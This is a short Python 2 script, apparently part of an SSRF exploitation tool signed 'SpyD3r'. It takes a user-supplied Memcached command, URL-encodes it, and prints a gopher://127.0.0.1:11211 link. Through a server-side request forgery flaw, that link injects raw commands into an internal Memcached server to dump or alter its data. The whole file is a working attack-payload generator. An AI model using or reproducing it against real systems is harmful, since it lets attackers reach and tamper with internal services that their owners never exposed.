import urllib

def DumpMemcached():
    code = raw_input("\033[96m" +"Give payload you want to run in Memcached Server: "+ "\033[0m")

    payload = urllib.quote_plus(code).replace("+","%20").replace("%2F","/").replace("%25","%").replace("%3A",":")

    finalpayload = "gopher://127.0.0.1:11211/_%0d%0a" + payload + "%0d%0a"

    print "\033[93m" +"\nYour gopher link is ready to dump Memcache : \n"+ "\033[0m"
    print finalpayload
    print "\n" + "\033[41m" +"-----------Made-by-SpyD3r-----------"+ "\033[0m"
